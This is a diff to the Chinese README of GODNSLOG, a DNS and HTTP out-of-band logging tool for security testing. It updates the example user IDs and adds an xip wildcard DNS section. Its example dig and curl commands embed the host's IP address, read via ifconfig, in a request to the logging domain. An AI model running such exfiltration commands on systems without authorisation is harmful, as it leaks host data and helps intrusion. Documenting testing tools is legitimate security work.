@@ -7,13 +7,14 @@ GODNSLOG功能特性:
 - HTTPLOG 记录
 - DNS Rebinding
 - 记录结果推送
+- xip任意ip解析
 
 
 每一个`GODNSLOG`用户会分配一个唯一的域名，域名前缀为`shortId`是godnslog平台的唯一用户标识。 `安全设置`页面中如下图
 
 ![](https://s1.ax1x.com/2020/08/31/dXPXGR.png)
 
-`bkkpdcy7lo84.godnslog.com`是给当前用户分配的唯一域名，`bkkpdcy7lo84`为`shortId`区分用户, 三级域名`*.bkkpdcy7lo84.godnslog.com`下所有DNS请求记录均会被记录下来，`*`字段由用户自定义，建议跟扫描ID对应起来，用来关联扫描结果。 
+`712hu2c4gy34.godnslog.com`是给当前用户分配的唯一域名，`712hu2c4gy34`为`shortId`区分用户, 三级域名`*.712hu2c4gy34.godnslog.com`下所有DNS请求记录均会被记录下来，`*`字段由用户自定义，建议跟扫描ID对应起来，用来关联扫描结果。 
 
 
 ## DNS LOG功能
@@ -23,10 +24,10 @@ GODNSLOG功能特性:
 
 
 ```bash
-dig `/sbin/ifconfig eth0|grep inet|grep -v 127.0.0.1|grep -v inet6|awk '{print $2}'|tr -d "addr:"`.ktqlujjpgc4j.godnslog.com
+dig `/sbin/ifconfig eth0|grep inet|grep -v 127.0.0.1|grep -v inet6|awk '{print $2}'|tr -d "addr:"`.712hu2c4gy34.godnslog.com
 ```
 
-系统生成域名为`{$variable}.ktqlujjpgc4j.godnslog.com`，其中`ktqlujjpgc4j`是用户唯一shortId，`{$variable}`为用户自定义变量
+系统生成域名为`{$variable}.712hu2c4gy34.godnslog.com`，其中`712hu2c4gy34`是用户唯一shortId，`{$variable}`为用户自定义变量
 
 
 ![](https://s1.ax1x.com/2020/08/31/dXPba4.png)
@@ -70,6 +71,16 @@ curl http://100.100.100.100/log/ktqlujjpgc4j/`/sbin/ifconfig eth0|grep inet|grep
 在配置->系统->基础设置中填写callback，GODNSLOG会在接收到DNSLOG或者HTTPLOG时向此回调地址主动推送本次日志记录
 
 ![](https://s1.ax1x.com/2020/08/31/dXicy6.png)
+
+
+## xip
+
+http://godnslog.com
+
+	   10.0.0.1.godnslog.com   resolves to   10.0.0.1
+	      www.10.0.0.1.godnslog.com   resolves to   10.0.0.1
+	   mysite.10.0.0.1.godnslog.com   resolves to   10.0.0.1
+	  foo.bar.10.0.0.1.godnslog.com   resolves to   10.0.0.1
 
 ## 编辑文档
 
